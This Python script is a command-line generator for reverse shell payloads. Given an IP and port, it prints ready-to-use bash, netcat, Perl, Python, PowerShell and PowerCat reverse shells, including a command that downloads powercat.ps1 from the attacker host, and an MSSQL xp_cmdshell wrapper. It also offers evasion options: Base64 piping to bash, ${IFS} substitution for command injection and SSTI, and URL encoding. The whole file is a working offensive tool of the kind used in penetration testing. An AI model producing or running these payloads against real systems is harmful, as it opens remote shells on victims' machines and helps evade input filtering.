import argparse
import urllib.parse
import subprocess
import base64

parser = argparse.ArgumentParser(description="Generate different types of reverse shell commands and environment checks.")
parser.add_argument("ip_address", help="IP address for the reverse shell.")
parser.add_argument("port", type=int, help="Port for the reverse shell.")
parser.add_argument("-b", "--bash", action="store_true", help="Generate a Bash reverse shell command.")
parser.add_argument("-n", "--netcat", action="store_true", help="Generate a Netcat reverse shell command.")
parser.add_argument("-p", "--perl", action="store_true", help="Generate a Perl reverse shell command.")
parser.add_argument("-y", "--python", action="store_true", help="Generate a Python reverse shell command.")
parser.add_argument("-y3", "--python3", action="store_true", help="Generate a Python 3 reverse shell command.")
parser.add_argument("-w", "--winenv", action="store_true", help="Generate command to test Windows environment (CMD or PowerShell).")
parser.add_argument("-u", "--unixenv", action="store_true", help="Generate command to test Unix/Linux environment.")
parser.add_argument("-e", "--urlencode", action="store_true", help="Custom URLencode the reverse shell command.")
parser.add_argument("-ps", "--powershell", action="store_true", help="Generate a PowerShell reverse shell command in Base64.")
parser.add_argument("-b64", "--base64", action="store_true", help="Encode the command in Base64 and wrap it for bash execution.")
parser.add_argument("-pc", "--powercat", action="store_true", help="Generate a PowerCat command.")
parser.add_argument("-m", "--mssql", action="store_true", help="Generate an MSSQL xp_cmdshell command.")
parser.add_argument("-ifs", "--use-ifs", type=str, choices=['injection', 'ssti'], help="Replace spaces with ${IFS%%??} for command injection or {IFS} for SSTI.")
args = parser.parse_args()

def check_exclusive_options():
    exclusive_options = [args.bash, args.netcat, args.perl, args.python, args.python3, args.powercat]
    if sum(exclusive_options) > 1:
        parser.error("Options -b, -n, -p, -y, -y3, -pc are mutually exclusive; please select only one.")

    env_options = [args.winenv, args.unixenv]
    if sum(env_options) > 1:
        parser.error("Options -w and -u are mutually exclusive and cannot be selected together.")

    if (args.winenv or args.unixenv) and any([args.bash, args.netcat, args.perl, args.python, args.python3, args.powershell, args.powercat, args.mssql]):
        parser.error("-w and -u can only be selected with -ifs, -b64, or -e.")


def replace_with_ifs(command, replacement_type):
    if replacement_type == 'ssti':
        return command.replace(' ', '{IFS}')
    else:
        return command.replace(' ', '${IFS%??}')

def generate_bash_shell(ip, port):
    return f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"

def generate_nc_shell(ip, port):
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f"

def generate_perl_shell(ip, port):
    return (f"perl -e 'use Socket;$i=\"{ip}\";$p={port};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"
            "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'")

def generate_python_shell(ip, port):
    return (f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); "
            f"os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
            f"p=subprocess.call([\"/bin/bash\",\"-i\"]);'")

def generate_python3_shell(ip, port):
    return (f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); "
            f"os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
            f"subprocess.run([\"/bin/bash\",\"-i\"]);'")

def generate_environment_test_windows():
    return "(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell"

def generate_environment_test_unix():
    return "echo $0"

def custom_url_encode(command, encode_special_chars=True):
    encoded_command = ""
    for char in command:
        if char == ' ':
            encoded_command += '%20'
        elif not encode_special_chars and char in ['=', '+', '/', '\n']:
            encoded_command += char
        else:
            encoded_command += urllib.parse.quote(char, safe='')
    return encoded_command

def generate_powershell_base64(ip, port):
    try:
        result = subprocess.run(["./PowerShell-ReverseShellGenerator-Base64.sh", ip, str(port)], capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"An error occurred: {e}"

def base64_encode(command):
    encoded_bytes = base64.b64encode(command.encode('utf-8'))
    return encoded_bytes.decode('utf-8')

def wrap_bash_base64(encoded_command):
    return f"bash -c 'echo \"{encoded_command}\" | base64 -d | bash'"

def generate_powercat_command(ip, listener_port):
    return f"Invoke-WebRequest -Uri http://{ip}:1337/powercat.ps1 -OutFile C:\\Windows\\Temp\\powercat.ps1; C:\\Windows\\Temp\\powercat.ps1 -c {ip} -p {listener_port} -e powershell"

def generate_mssql_xp_cmdshell(ip, port):
    ps_command = generate_powershell_base64(ip, port)
    ps_command = ps_command.strip() + "';"
    return f"EXECUTE xp_cmdshell '{ps_command}"

def main():
    check_exclusive_options()
    if not args.ip_address or not args.port:
        parser.print_help()
        return

    command = ""
    if args.bash:
        command = generate_bash_shell(args.ip_address, args.port)
    elif args.netcat:
        command = generate_nc_shell(args.ip_address, args.port)
    elif args.perl:
        command = generate_perl_shell(args.ip_address, args.port)
    elif args.python:
        command = generate_python_shell(args.ip_address, args.port)
    elif args.python3:
        command = generate_python3_shell(args.ip_address, args.port)
    elif args.powershell:
        command = generate_powershell_base64(args.ip_address, args.port)
    elif args.powercat:
        command = generate_powercat_command(args.ip_address, args.port)    
    elif args.mssql:
        command = generate_mssql_xp_cmdshell(args.ip_address, args.port)

    
    if args.winenv:
        command = generate_environment_test_windows()
    elif args.unixenv:
        command = generate_environment_test_unix()


    if args.use_ifs and args.base64:
        command = base64_encode(command)
        command = wrap_bash_base64(command)
        command = replace_with_ifs(command, args.use_ifs)
    elif args.base64:
        command = base64_encode(command)
        command = wrap_bash_base64(command)
    elif args.use_ifs:
        command = replace_with_ifs(command, args.use_ifs)


    if args.urlencode:
        encode_special_chars = not args.powershell and not args.base64
        command = custom_url_encode(command, encode_special_chars)

    if command:
        print("Generated command:")
        print(command)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
